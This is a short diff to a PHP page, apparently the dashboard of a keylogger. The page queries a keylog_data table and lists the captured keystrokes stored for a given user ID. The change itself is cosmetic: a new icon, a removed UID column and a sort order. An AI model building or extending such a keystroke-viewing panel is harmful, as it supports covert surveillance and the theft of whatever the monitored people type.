@@ -179,18 +179,17 @@ if (!$uid) {
 
             <!-- Bloc 2 : Info tapée -->
             <div class="custom-card">
-              <h5><i class="bx bx-keyboard custom-icon"></i> Info tapée</h5>
+              <h5><i class="bx bx-message-square-dots custom-icon"></i> Info tapée</h5>
               <table class="custom-table">
                 <thead>
                   <tr>
-                    <th>UID</th>
                     <th>Texte tapé</th>
                   </tr>
                 </thead>
                 <tbody>
                   <?php
                   // Requête SQL pour récupérer les informations des frappes
-                  $sql = "SELECT uid, key_stroke FROM keylog_data WHERE uid = ?";
+                  $sql = "SELECT key_stroke FROM keylog_data WHERE uid = ? ORDER BY key_stroke DESC";
                   $stmt = $conn->prepare($sql);
                   $stmt->bind_param("s", $uid);
                   $stmt->execute();
@@ -200,7 +199,6 @@ if (!$uid) {
                   if ($result->num_rows > 0) {
                     while ($row = $result->fetch_assoc()) {
                       echo "<tr>";
-                      echo "<td>" . htmlspecialchars($row['uid']) . "</td>";
                       echo "<td>" . htmlspecialchars($row['key_stroke']) . "</td>";
                       echo "</tr>";
                     }
